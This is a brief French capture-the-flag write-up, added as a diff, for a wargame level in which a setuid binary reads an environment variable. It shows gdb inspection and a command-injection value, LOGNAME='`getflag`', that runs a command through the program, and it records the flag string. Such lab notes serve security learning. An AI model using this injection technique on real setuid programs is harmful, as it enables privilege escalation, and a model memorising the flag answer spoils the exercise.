@@ -1,0 +1,13 @@
+flag07: getflag fiumuikeil55xe9cu4dood66h
+
+ls -la on trouve l’exec level07
+./level07 affiche level07
+gdb disass main du level07
+on voit setuid puis getenv
+on affiche l’env : 
+on se rend compte que les variables USER et LOGNAME ont les valeurs “level07”
+./level07 appele donc l’une de ces variable d’env
+export USER=’`getflag`’ ne marche pas 
+export LOGNAME=’`getflag`’ get le flag !
+Les doubles quotes ne marchent pas, il faut des simple quotes
+
